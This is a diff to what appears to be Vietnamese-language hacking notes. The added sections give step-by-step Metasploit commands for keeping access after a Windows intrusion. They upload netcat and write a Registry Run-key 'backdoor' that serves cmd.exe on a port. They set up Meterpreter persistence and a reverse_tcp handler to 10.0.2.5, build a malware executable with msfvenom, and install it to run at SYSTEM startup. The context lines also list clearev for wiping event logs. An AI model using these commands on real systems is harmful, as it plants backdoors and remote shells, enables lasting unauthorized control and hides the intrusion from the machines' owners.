@@ -31,3 +31,27 @@ Sysinfo
 Clearev 
 Run event_manager -c
 8.	Snort
+9.	TẤN CÔNG Registry để giữ kết nối vĩnh viễn sau khi thâm nhập system
+upload nc.exe C:\\Windows\\System32
+reg enumkey -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+
+reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v backdoor -d 'C:\Windows\System32\nc.exe -Ldp 4449 -e cmd.exe'
+
+reg queryval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v backdoor
+
+(win + R) regedit
+
+10.	TẤN CÔNG và giữ kết nối vĩnh viễn với Advanced Meterpreter Wormhole
+meterpreter > run persistence -X -p 4442 -i 5 -r 10.0.2.5
+meterpreter > bg
+
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set lhost 10.0.2.5
+msf6 exploit(multi/handler) > set lport 4442
+msf6 exploit(multi/handler) > run
+
+(tao malware) msfvenom -p windows/meterpreter/reverse_tcp -a x86 –platform windows -f exe LHOST=10.0.2.5 LPORT=4442 -o /root/codinh.exe
+
+meterpreter > run post/windows/manage/persistence_exe REXENAME=persistence.exe REXEPATH=/root/codinh.exe STARTUP=SYSTEM
+
+meterpreter > bg
